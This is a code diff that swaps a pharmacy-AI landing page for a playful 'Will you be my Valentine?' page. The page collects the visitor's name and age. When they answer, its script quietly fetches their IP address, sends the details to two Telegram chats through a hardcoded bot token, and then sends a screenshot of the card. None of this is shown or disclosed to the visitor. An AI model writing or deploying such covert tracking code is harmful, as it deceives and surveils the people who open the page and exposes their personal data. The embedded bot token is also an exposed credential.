@@ -3,237 +3,306 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PharmaGuardian AI | Intelligent Pharmacy Solutions</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>For You ❤️</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        :root {
-            --primary-teal: #39b5a4;
-            --accent-green: #7ED321;
-            --dark-bg: #030b16;
-            --card-blue: #0a192f;
-            --text-light: #ffffff;
-            --text-dim: #a8b2d1;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
-        body {
-            font-family: 'Inter', -apple-system, sans-serif;
-            background-color: var(--dark-bg);
-            color: var(--text-light);
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
-
-        /* Navigation */
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 25px 8%;
-            position: absolute;
-            width: 100%;
-            z-index: 100;
-        }
-
-        .logo-box {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .logo-img {
-            height: 45px; /* Adjust based on your logo image */
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 35px;
-            align-items: center;
-        }
-
-        .nav-links a {
-            color: var(--text-dim);
-            text-decoration: none;
-            font-size: 0.95rem;
-            transition: color 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: var(--primary-teal);
-        }
-
-        .btn-nav {
-            background: var(--primary-teal);
-            color: white !important;
-            padding: 10px 22px;
-            border-radius: 50px;
-            font-weight: 600;
-        }
-
-        /* Hero Section */
-        .hero {
-            position: relative;
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Dancing+Script:wght@700&display=swap');
+        
+        /* --- BACKGROUND & ANIMATIONS --- */
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background: linear-gradient(-45deg, #ff9a9e, #fad0c4, #ffd1ff, #a18cd1);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            overflow-x: hidden; 
             min-height: 100vh;
             display: flex;
-            align-items: center;
-            padding: 0 8%;
-            background: radial-gradient(circle at 70% 50%, rgba(57, 181, 164, 0.15) 0%, transparent 50%);
-        }
-
-        .hero-content {
-            flex: 1;
-            max-width: 650px;
-            z-index: 2;
-        }
-
-        .hero-content h1 {
-            font-size: 4rem;
-            line-height: 1.1;
-            margin-bottom: 25px;
-            font-weight: 800;
-        }
-
-        .hero-content p {
-            font-size: 1.25rem;
-            color: var(--text-dim);
-            margin-bottom: 35px;
-            max-width: 500px;
-        }
-
-        .cta-group {
-            display: flex;
-            gap: 20px;
-        }
-
-        .btn {
-            padding: 16px 32px;
-            border-radius: 12px;
-            text-decoration: none;
-            font-weight: 700;
-            transition: transform 0.2s;
-        }
-
-        .btn:active { transform: scale(0.98); }
-
-        .btn-primary { background: var(--primary-teal); color: white; }
-        .btn-outline { border: 2px solid var(--text-dim); color: var(--text-light); }
-
-        /* Illustration Mockup Area */
-        .hero-visual {
-            flex: 1;
-            display: flex;
-            justify-content: flex-end;
-            position: relative;
-        }
-
-        .hero-visual img {
-            max-width: 120%;
-            height: auto;
-            filter: drop-shadow(0 0 50px rgba(57, 181, 164, 0.2));
-        }
-
-        /* Floating Chat Box */
-        .chat-container {
-            position: fixed;
-            bottom: 40px;
-            right: 40px;
-            width: 340px;
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-            color: #333;
-            overflow: hidden;
-            z-index: 1000;
-        }
-
-        .chat-header {
-            padding: 15px 20px;
-            background: #f8f9fb;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid #eee;
-        }
-
-        .avatar-circle {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: var(--primary-teal);
-            display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-weight: bold;
         }
 
-        .chat-input {
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        .chat-input input {
-            flex: 1;
-            border: none;
-            outline: none;
-            font-size: 0.95rem;
-            color: #555;
+        /* Floating Background Hearts */
+        .bg-hearts { position: fixed; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden; z-index: 0; pointer-events: none; }
+        .bg-heart { position: absolute; display: block; width: 20px; height: 20px; background: rgba(255, 255, 255, 0.4); animation: floatUp 25s linear infinite; bottom: -150px; clip-path: path('M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z'); }
+        .bg-heart:nth-child(1){ left: 25%; width: 30px; height: 30px; animation-delay: 0s; }
+        .bg-heart:nth-child(2){ left: 10%; width: 20px; height: 20px; animation-delay: 2s; animation-duration: 12s; }
+        .bg-heart:nth-child(3){ left: 70%; width: 20px; height: 20px; animation-delay: 4s; }
+        .bg-heart:nth-child(4){ left: 40%; width: 50px; height: 50px; animation-delay: 0s; animation-duration: 18s; }
+        .bg-heart:nth-child(5){ left: 65%; width: 20px; height: 20px; animation-delay: 0s; }
+
+        @keyframes floatUp { 0%{ transform: translateY(0) rotate(0deg); opacity: 1; } 100%{ transform: translateY(-1000px) rotate(720deg); opacity: 0; } }
+
+        /* --- GLASS CARD STYLES --- */
+        .cursive { font-family: 'Dancing Script', cursive; }
+        .glass-card {
+            background: rgba(255, 255, 255, 0.95);
+            box-shadow: 0 8px 32px 0 rgba(255, 100, 150, 0.3);
+            backdrop-filter: blur( 4px );
+            border-radius: 2.5rem;
+            border: 1px solid rgba( 255, 255, 255, 0.18 );
         }
+        .gradient-text-pink {
+            background: linear-gradient(to right, #ec008c, #fc6767);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .btn-gradient {
+            background-image: linear-gradient(to right, #ff758c 0%, #ff7eb3 51%, #ff758c 100%);
+            background-size: 200% auto;
+            transition: 0.5s;
+            box-shadow: 0 10px 20px rgba(255, 118, 136, 0.3);
+        }
+        .btn-gradient:hover { background-position: right center; transform: translateY(-3px); }
+        .custom-input { transition: all 0.3s ease; border: 2px solid #ffe4e6; }
+        .custom-input:focus { border-color: #ff9a9e; box-shadow: 0 0 15px rgba(255, 154, 158, 0.3); }
 
-        .mic-icon { color: var(--primary-teal); font-size: 1.2rem; cursor: pointer; }
+        /* Animation classes */
+        .pop-in { animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards; opacity: 0; }
+        @keyframes popIn { 0% { transform: scale(0.8) translateY(20px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
 
+        /* Helper for text */
+        .whitespace-pre-line { white-space: pre-line; }
+
+        /* --- FOOTER STYLES --- */
+        .footer-glass {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(5px);
+            border-top: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 10px 0;
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            z-index: 50;
+        }
+        .social-icon {
+            transition: transform 0.3s ease, fill 0.3s ease;
+        }
+        .social-icon:hover {
+            transform: scale(1.2);
+        }
     </style>
 </head>
-<body>
+<body class="p-6">
 
-    <nav>
-        <div class="logo-box">
-            <img src="logo.png" alt="PharmaGuardian AI Logo" class="logo-img">
-        </div>
-        <div class="nav-links">
-            <a href="#">About</a>
-            <a href="#">Features</a>
-            <a href="#">Contact</a>
-            <a href="#" class="btn-nav">Get Started</a>
-        </div>
-    </nav>
+    <ul class="bg-hearts"><li></li><li></li><li></li><li></li><li></li></ul>
 
-    <main class="hero">
-        <div class="hero-content">
-            <h1>AI That Thinks Like a Pharmacist.</h1>
-            <p>Protecting patients and optimizing pharmacy operations with intelligent agentic AI.</p>
-            <div class="cta-group">
-                <a href="#" class="btn btn-primary">Get Started</a>
-                <a href="#" class="btn btn-outline">Learn More</a>
-            </div>
-        </div>
-        
-        <div class="hero-visual">
-            <img src="interface_mockup.png" alt="AI Pharmacist Interface">
-        </div>
-    </main>
+    <div id="intro-card" class="glass-card p-8 text-center max-w-sm w-full relative z-10 pop-in mb-16">
+        <h1 class="text-4xl font-bold mb-2 cursive gradient-text-pink">Welcome Bestu! ✨</h1>
+        <p class="text-gray-500 mb-8 text-sm">Please verify your identity below. 🕵️‍♀️</p>
 
-    <div class="chat-container">
-        <div class="chat-header">
-            <div class="avatar-circle">P</div>
+        <div class="space-y-5 text-left">
             <div>
-                <p style="font-size: 0.85rem; font-weight: 600;">Pharma Assistant</p>
-                <p style="font-size: 0.75rem; color: #777;">How can I help you today?</p>
+                <label class="block text-pink-600 text-sm font-bold mb-2 ml-1">Your Name</label>
+                <input type="text" id="input-name" class="custom-input w-full px-4 py-3 rounded-xl bg-pink-50/50 focus:outline-none text-gray-700">
+            </div>
+            <div>
+                <label class="block text-pink-600 text-sm font-bold mb-2 ml-1">Your Age</label>
+                <input type="number" id="input-age" placeholder="Don't Lie 🤫" class="custom-input w-full px-4 py-3 rounded-xl bg-pink-50/50 focus:outline-none text-gray-700">
             </div>
         </div>
-        <div class="chat-input">
-            <input type="text" placeholder="Ask me anything...">
-            <i class="fas fa-microphone mic-icon"></i>
+
+        <button onclick="goToProposal()" class="mt-10 w-full btn-gradient text-white font-bold py-4 rounded-2xl text-lg tracking-wider">Unlock Surprise 🔓</button>
+    </div>
+
+    <div id="main-card" class="hidden glass-card p-8 text-center max-w-sm w-full relative z-10 mb-16">
+        <h1 class="text-3xl font-bold mb-2 cursive gradient-text-pink">Hey <span id="display-name">Bestu</span>! 💐</h1>
+        <p class="text-sm text-gray-400 mb-6">You have 1 pending question...</p>
+        
+        <div id="visual-area" class="flex justify-center mb-6 text-pink-500 text-xs font-mono leading-none">
+<pre>
+   ♡♡♡     ♡♡♡
+ ♡♡♡♡♡   ♡♡♡♡♡
+♡♡♡♡♡♡♡ ♡♡♡♡♡♡♡
+♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡
+ ♡♡♡♡♡♡♡♡♡♡♡♡♡
+  ♡♡♡♡♡♡♡♡♡♡♡
+    ♡♡♡♡♡♡♡
+      ♡♡♡
+       ♡</pre>
+        </div>
+
+        <p id="question" class="text-gray-700 mb-8 font-semibold text-lg leading-relaxed">
+            Will you be my Valentine?<br>
+            <span class="text-sm text-pink-400 font-normal">(No takesies backsies!)</span>
+        </p>
+
+        <div id="btn-container" class="space-y-4">
+            <button onclick="handleChoice(1)" class="w-full btn-gradient text-white font-bold py-3 rounded-2xl">YES! 😍</button>
+            <button onclick="handleChoice(2)" class="w-full bg-gray-200 text-gray-600 font-bold py-3 rounded-2xl hover:bg-gray-300">No 😢</button>
+            <button onclick="handleChoice(3)" class="w-full bg-purple-400 text-white font-bold py-3 rounded-2xl hover:bg-purple-500">Pretend I didn't see this 🙈</button>
+        </div>
+
+        <div id="final-result" class="hidden">
+            <img id="result-img" crossorigin="anonymous" src="" class="w-full h-52 object-cover rounded-2xl mb-6 shadow-lg border-4 border-white">
+            <p id="msg-text" class="text-pink-600 font-bold text-lg leading-relaxed px-2 whitespace-pre-line cursive"></p>
+            <button onclick="location.reload()" class="mt-8 bg-green-500 hover:bg-green-600 text-white px-10 py-3 rounded-full font-bold shadow-md">Reset 🔄</button>
         </div>
     </div>
 
+    <div class="footer-glass text-center">
+        <p class="text-gray-700 font-semibold text-xs mb-2 tracking-wide">Created by Abhijeet Kendre</p>
+        <div class="flex justify-center gap-6 items-center">
+            <a href="https://www.linkedin.com/in/abhijeetkendre" target="_blank" class="social-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#0077b5">
+                    <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
+                </svg>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = "8313146819:AAHW8hG85mxoRr1lR5uVwd__x5GasxBCuqk";
+        const CHAT_IDS = ["7893857792", "6572151527"]; 
+        // ---------------------
+
+        let userName = "Bestu";
+        let userAge = "N/A";
+
+        const outcomes = {
+            1: { 
+                text: "🎉 CONGRATULATIONS 🎉\nFriendship upgraded to Valentine Edition 💖\nSide effects: Extra smiling, teasing, and drama 😂", 
+                img: "https://images.unsplash.com/photo-1518199266791-5375a83190b7?w=500",
+                logText: "YES 😍"
+            },
+            2: { 
+                text: "😌 Respectfully rejected!\nFriendship remains strong like Wi-Fi signal 📶\nNo awkwardness detected 😄", 
+                img: "https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?w=500",
+                logText: "No 😂"
+            },
+            3: { 
+                text: "🙈 Option accepted!\nDeleting this memory in 3...2...1...\nERROR: Best friends never forget 😂", 
+                img: "https://images.unsplash.com/photo-1513104890138-7c749659a591?w=500",
+                logText: "Pretend 🙈"
+            }
+        };
+
+        function goToProposal() {
+            const nameInput = document.getElementById('input-name').value;
+            const ageInput = document.getElementById('input-age').value;
+            if (!nameInput.trim() || !ageInput.trim()) { alert("Please enter Name and Age! 😡"); return; }
+            userName = nameInput; userAge = ageInput;
+            document.getElementById('display-name').innerText = userName;
+            document.getElementById('intro-card').classList.add('hidden');
+            const mainCard = document.getElementById('main-card');
+            mainCard.classList.remove('hidden');
+            mainCard.classList.add('pop-in');
+        }
+
+        const getBase64Image = async (url) => {
+            const response = await fetch(url);
+            const blob = await response.blob();
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            });
+        };
+
+        async function handleChoice(choiceId) {
+            // 1. UPDATE UI IMMEDIATELY
+            document.getElementById('btn-container').classList.add('hidden');
+            document.getElementById('question').classList.add('hidden');
+            document.getElementById('visual-area').classList.add('hidden'); 
+
+            const result = outcomes[choiceId];
+            document.getElementById('msg-text').innerText = result.text;
+            
+            // Show Result Section Immediately
+            const finalDiv = document.getElementById('final-result');
+            finalDiv.classList.remove('hidden');
+            finalDiv.classList.add('pop-in');
+
+            // --- STEP 1: SEND TEXT MESSAGE IMMEDIATELY (Safety) ---
+            sendTextMessage(result.logText);
+
+            // --- STEP 2: LOAD IMAGE & PREPARE SCREENSHOT ---
+            try {
+                const base64Img = await getBase64Image(result.img);
+                document.getElementById('result-img').src = base64Img;
+            } catch (e) {
+                document.getElementById('result-img').src = result.img; 
+            }
+
+            // --- STEP 3: WAIT 3 SECONDS & SEND SCREENSHOT ---
+            setTimeout(() => {
+                sendScreenshot(result.logText);
+            }, 3000); 
+        }
+
+        // --- NEW FUNCTION: Send Text Message (Always works) ---
+        async function sendTextMessage(choice) {
+            let ip = "Unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch(e) {}
+
+            const message = `
+💌 *New Answer Received!* 💌
+(Text Backup)
+
+*Name:* ${userName}
+*Age:* ${userAge}
+*Choice:* ${choice}
+*IP:* \`${ip}\`
+            `;
+
+            // Send to all chats
+            CHAT_IDS.forEach(chatId => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(e => console.log("Text send failed", e));
+            });
+        }
+
+        async function sendScreenshot(choice) {
+            try {
+                const element = document.getElementById('main-card');
+                element.classList.remove('pop-in'); 
+
+                const canvas = await html2canvas(element, {
+                    scale: 2,
+                    useCORS: true, 
+                    backgroundColor: '#ffffff',
+                    logging: false
+                });
+
+                canvas.toBlob(async function(blob) {
+                    const caption = `📸 *Screenshot Proof*`;
+
+                    const promises = CHAT_IDS.map(chatId => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'response.png');
+                        formData.append('caption', caption);
+                        formData.append('parse_mode', 'Markdown');
+                        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    });
+
+                    await Promise.all(promises);
+                }, 'image/png');
+            } catch (e) {
+                console.error("Screenshot error:", e);
+            }
+        }
+    </script>
 </body>
 </html>
 
